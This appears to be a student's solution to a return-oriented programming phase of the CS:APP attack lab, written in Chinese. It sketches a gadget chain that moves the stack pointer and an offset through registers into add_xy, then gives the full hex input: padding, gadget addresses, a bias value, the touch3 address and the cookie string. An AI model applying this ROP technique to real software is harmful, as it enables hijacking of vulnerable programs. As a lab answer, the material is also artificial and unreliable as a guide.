利用add_xy，得到偏移后的地址，指向字符串
需要将偏移量和栈指针分别存入%rdi和%rsi
栈指针路线：%rsp->%rdi
偏移量路线：pop->%rax->%edx->%ecx->%esi
输入见下方
input:
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 /* add 190*/
c5 19 40 00 00 00 00 00 /* set 426*/
ab 19 40 00 00 00 00 00 /* add 219*/
50 00 00 00 00 00 00 00 /* bias*/
dd 19 40 00 00 00 00 00 /* get 481*/
69 1a 40 00 00 00 00 00 /* get 311*/
13 1a 40 00 00 00 00 00 /* add 436*/
d6 19 40 00 00 00 00 00 /* add xy*/
c5 19 40 00 00 00 00 00 /* set 426*/
fa 18 40 00 00 00 00 00 /* touch3*/
35 39 62 39 39 37 66 61 /* cookie data*/
00 00 00 00 00 00 00 00 /* '\0'*/
